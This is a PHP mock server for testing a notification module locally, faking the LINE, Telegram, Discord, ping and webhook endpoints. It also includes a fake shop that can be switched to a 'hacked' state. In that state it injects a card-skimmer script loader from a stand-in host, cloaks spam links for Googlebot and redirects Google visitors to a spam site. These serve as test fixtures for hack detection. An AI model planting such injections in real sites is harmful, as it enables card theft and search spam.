<?php
/**
 * A stand-in for the LINE Messaging API push endpoint, so you can try everything without a LINE account
 * and without spending your monthly message quota.
 *
 *   php -S 127.0.0.1:8765 scripts/fake_line_server.php
 *
 * Then point the module at it:   'line_api_base' => 'http://127.0.0.1:8765'
 *
 * Every accepted push is printed in this terminal and appended to  <system temp>/fake-line-inbox.ndjson
 * Simulate LINE refusing (e.g. monthly quota used up):  FAKE_LINE_STATUS=429 php -S ...
 *
 * It also plays the outside check-in service, so `ping_url` can be tried without signing up anywhere:
 *   'ping_url' => 'http://127.0.0.1:8765/ping/anything'        answers 200 "OK" and prints "check-in received"
 *   'ping_url' => 'http://127.0.0.1:8765/ping-slow/anything'   answers after 4 seconds (to see the timeout work)
 *   'ping_url' => 'http://127.0.0.1:8765/ping-down/anything'   answers 500
 *
 * And a generic incoming webhook, for trying a `notifier` of your own:
 *   POST http://127.0.0.1:8765/hook/anything   with a JSON body; prints its "text" field (or the raw body)
 *
 * Telegram and Discord, too:
 *   'telegram_api_base'   => 'http://127.0.0.1:8765',  'telegram_bot_token' => '123:TEST',  'telegram_chat_id' => '42'
 *   'discord_webhook_url' => 'http://127.0.0.1:8765/api/webhooks/1/ok'
 * The chat id (Telegram) or the last part of the webhook address (Discord) picks how it answers:
 *   anything else   accepted                    500    a server error
 *   429-once        "too many requests, wait 1 second" the first time, then accepted
 *   429-long        "too many requests, wait 30 seconds", every time
 *   slow            answers after 12 seconds (longer than the module waits)
 *   gone            Telegram: chat not found (400); Discord: unknown webhook (404)
 * Like the real ones it refuses a message longer than 4096 (Telegram) or 2000 (Discord) characters.
 *
 * LINE's "how many friends" question (GET /v2/bot/insight/followers?date=yyyyMMdd) answers 3 friends;
 * FAKE_LINE_FRIENDS=500 php -S ... to play the account your customers follow.
 *
 * And a small shop for trying `page_watch`:
 *   'page_watch' => array('http://127.0.0.1:8765/shop/')
 *   http://127.0.0.1:8765/shop/hack   from now on the shop is "hacked": a card-skimming script for everybody,
 *                                     spam links only for Google's crawler, and visitors coming from Google
 *                                     are redirected to a spam site
 *   http://127.0.0.1:8765/shop/clean  back to normal
 *   /shop/moved redirects to /shop/ (same site), /shop/away to another site.
 */

$inbox = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/fake-line-inbox.ndjson';
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

function reply($code, $body)
{
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode($body);
    return true;
}

if ($path === '/inbox' && $_SERVER['REQUEST_METHOD'] === 'GET')
{
    header('Content-Type: text/plain; charset=UTF-8');
    echo is_file($inbox) ? file_get_contents($inbox) : '';
    return true;
}
if (preg_match('#^/ping(-slow|-down)?/#', (string) $path, $m))
{
    $kind = isset($m[1]) ? $m[1] : '';
    if ($kind === '-slow')
    {
        sleep(4);
    }
    file_put_contents($inbox, json_encode(array('t' => time(), 'ping' => $kind === '' ? 'ok' : substr($kind, 1), 'method' => $_SERVER['REQUEST_METHOD'])) . "\n", FILE_APPEND | LOCK_EX);
    file_put_contents('php://stderr', "\n----- check-in received (" . $_SERVER['REQUEST_METHOD'] . ($kind === '' ? '' : ', ' . substr($kind, 1)) . ") -----\n");
    http_response_code($kind === '-down' ? 500 : 200);
    header('Content-Type: text/plain');
    echo $kind === '-down' ? 'Simulated error' : 'OK';
    return true;
}
if (strpos((string) $path, '/hook/') === 0 && $_SERVER['REQUEST_METHOD'] === 'POST')
{
    $raw = (string) file_get_contents('php://input');
    $json = json_decode($raw, true);
    $shown = is_array($json) && isset($json['text']) ? (string) $json['text'] : $raw;
    file_put_contents($inbox, json_encode(array('t' => time(), 'hook' => $shown), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
    file_put_contents('php://stderr', "\n----- webhook received -----\n" . $shown . "\n");
    return reply(200, array('ok' => true));
}
if (strpos((string) $path, '/shop/') === 0)
{
    $flag = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/fake-shop-hacked.flag';
    if ($path === '/shop/hack' || $path === '/shop/clean')
    {
        $path === '/shop/hack' ? touch($flag) : @unlink($flag);
        header('Content-Type: text/plain');
        echo $path === '/shop/hack' ? "The shop is now hacked.\n" : "The shop is clean again.\n";
        return true;
    }
    if ($path === '/shop/moved')
    {
        header('Location: /shop/', true, 301);
        return true;
    }
    if ($path === '/shop/away')
    {
        header('Location: https://elsewhere.example/landing', true, 302);
        return true;
    }
    if ($path !== '/shop/')
    {
        return reply(404, array('message' => 'Not found'));
    }
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $hacked = is_file($flag);
    if ($hacked && strpos($ref, 'google.') !== false && stripos($ua, 'Googlebot') === false)
    {
        header('Location: https://spam-landing.example/?from=shop', true, 302);   // visitors from Google are sent away
        return true;
    }
    $html = '<!doctype html><html><head><meta charset="utf-8"><title>Fake shop</title>'
        . '<script src="/js/app.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-TEST"></script>'
        . ($hacked ? '<script>var s=document.createElement("script");s.src="https:\/\/cdn-skimmer.example\/s.js";document.head.appendChild(s);</script>' : '')
        . '</head><body><h1>Fake shop</h1><a href="/cart">Cart</a> <a href="https://www.facebook.com/fakeshop">Facebook</a>'
        . '<form action="/search"><input name="q"></form>'
        . ($hacked && stripos($ua, 'Googlebot') !== false ? '<div style="display:none"><a href="https://casino-spam.example/">casino</a></div>' : '')
        . '</body></html>';
    $enc = isset($_SERVER['HTTP_ACCEPT_ENCODING']) ? $_SERVER['HTTP_ACCEPT_ENCODING'] : '';
    header('Content-Type: text/html; charset=UTF-8');
    if (strpos($enc, 'gzip') !== false && function_exists('gzencode'))
    {
        header('Content-Encoding: gzip');   // curl asks for it and unpacks it; plain streams do not ask
        $html = gzencode($html);
    }
    echo $html;
    return true;
}
if ($path === '/v2/bot/insight/followers' && $_SERVER['REQUEST_METHOD'] === 'GET')
{
    if (!isset($_GET['date']) || !preg_match('/^\d{8}$/', (string) $_GET['date']))
    {
        return reply(400, array('message' => 'date is required'));
    }
    return reply(200, array('status' => 'ready', 'followers' => (int) (getenv('FAKE_LINE_FRIENDS') ?: 3), 'targetedReaches' => 0, 'blocks' => 0));
}
/** Telegram and Discord count in UTF-16 code units: an emoji is two. */
function units16($s)
{
    return (int) preg_match_all('/./us', $s) + (int) preg_match_all('/[\x{10000}-\x{10FFFF}]/u', $s);
}

/** How the fake answers, picked by $mode. Returns null = go ahead and accept. */
function trouble($mode, $service)
{
    if ($mode === 'slow')
    {
        sleep(12);
    }
    if ($mode === '500')
    {
        return reply(500, $service === 'telegram' ? array('ok' => false, 'error_code' => 500, 'description' => 'Internal Server Error') : array('message' => '500: Internal Server Error', 'code' => 0));
    }
    $flag = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/fake-line-429-' . $service . '.flag';
    if ($mode === '429-long' || ($mode === '429-once' && !is_file($flag)))
    {
        if ($mode === '429-once')
        {
            touch($flag);
        }
        $wait = $mode === '429-long' ? 30 : 1;
        return reply(429, $service === 'telegram'
            ? array('ok' => false, 'error_code' => 429, 'description' => 'Too Many Requests: retry after ' . $wait, 'parameters' => array('retry_after' => $wait))
            : array('message' => 'You are being rate limited.', 'retry_after' => $mode === '429-long' ? 30.0 : 0.6, 'global' => false));
    }
    if ($mode === '429-once')
    {
        @unlink($flag);   // the second try goes through
    }
    if ($mode === 'gone')
    {
        return $service === 'telegram'
            ? reply(400, array('ok' => false, 'error_code' => 400, 'description' => 'Bad Request: chat not found'))
            : reply(404, array('message' => 'Unknown Webhook', 'code' => 10015));
    }
    return null;
}

if (preg_match('#^/bot([^/]+)/sendMessage$#', (string) $path, $m) && $_SERVER['REQUEST_METHOD'] === 'POST')
{
    if (!preg_match('/^[0-9]+:[A-Za-z0-9_-]+$/', $m[1]))
    {
        return reply(401, array('ok' => false, 'error_code' => 401, 'description' => 'Unauthorized'));
    }
    $req = json_decode((string) file_get_contents('php://input'), true);
    if (!is_array($req) || !isset($req['chat_id'], $req['text']) || $req['text'] === '')
    {
        return reply(400, array('ok' => false, 'error_code' => 400, 'description' => 'Bad Request: message text is empty'));
    }
    if (($r = trouble((string) $req['chat_id'], 'telegram')) !== null)
    {
        return $r;
    }
    $text = (string) $req['text'];
    if (units16($text) > 4096)
    {
        return reply(400, array('ok' => false, 'error_code' => 400, 'description' => 'Bad Request: message is too long'));
    }
    $notes = array_keys(array_intersect_key($req, array('parse_mode' => 1, 'link_preview_options' => 1, 'disable_web_page_preview' => 1)));
    file_put_contents($inbox, json_encode(array('t' => time(), 'telegram' => (string) $req['chat_id'], 'text' => $text, 'options' => $notes), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
    file_put_contents('php://stderr', "\n----- Telegram message to chat " . $req['chat_id'] . " -----\n" . $text . "\n");
    return reply(200, array('ok' => true, 'result' => array('message_id' => mt_rand(1, 99999))));
}
if (preg_match('#^/api/webhooks/([0-9]+)/([^/?]+)$#', (string) $path, $m) && $_SERVER['REQUEST_METHOD'] === 'POST')
{
    $req = json_decode((string) file_get_contents('php://input'), true);
    if (!is_array($req) || !isset($req['content']) || $req['content'] === '')
    {
        return reply(400, array('message' => 'Cannot send an empty message', 'code' => 50006));
    }
    if (($r = trouble($m[2], 'discord')) !== null)
    {
        return $r;
    }
    $text = (string) $req['content'];
    if (units16($text) > 2000)
    {
        return reply(400, array('message' => 'Invalid Form Body', 'code' => 50035, 'errors' => array('content' => array('_errors' => array(array('code' => 'BASE_TYPE_MAX_LENGTH', 'message' => 'Must be 2000 or fewer in length.'))))));
    }
    $quiet = isset($req['allowed_mentions']['parse']) && $req['allowed_mentions']['parse'] === array();
    file_put_contents($inbox, json_encode(array('t' => time(), 'discord' => $m[1], 'text' => $text, 'mentions_off' => $quiet,
        'flags' => isset($req['flags']) ? (int) $req['flags'] : 0), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
    file_put_contents('php://stderr', "\n----- Discord message (webhook " . $m[1] . ($quiet ? '' : ', WARNING: mentions not switched off') . ") -----\n" . $text . "\n");
    http_response_code(204);   // what Discord answers when the caller does not ask to wait for the message
    return true;
}
if ($path !== '/v2/bot/message/push' || $_SERVER['REQUEST_METHOD'] !== 'POST')
{
    return reply(404, array('message' => 'Not found'));
}
$auth = isset($_SERVER['HTTP_AUTHORIZATION']) ? $_SERVER['HTTP_AUTHORIZATION'] : '';
if (!preg_match('/^Bearer \S+/', $auth))
{
    return reply(401, array('message' => 'Authentication failed'));
}
$status = (int) (getenv('FAKE_LINE_STATUS') ?: 200);
if ($status !== 200)
{
    return reply($status, array('message' => $status === 429 ? 'You have reached your monthly limit.' : 'Simulated error'));
}
$req = json_decode((string) file_get_contents('php://input'), true);
if (!is_array($req) || empty($req['to']) || empty($req['messages'][0]['text']))
{
    return reply(400, array('message' => 'The request body has 1 error(s)'));
}
$text = (string) $req['messages'][0]['text'];
if ((function_exists('mb_strlen') ? mb_strlen($text, 'UTF-8') : preg_match_all('/./us', $text)) > 5000)
{
    return reply(400, array('message' => 'Length must be between 0 and 5000'));
}
file_put_contents($inbox, json_encode(array('t' => time(), 'to' => $req['to'], 'text' => $text), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
file_put_contents('php://stderr', "\n----- push to " . $req['to'] . " -----\n" . $text . "\n");
return reply(200, new stdClass());   // LINE answers {} on success
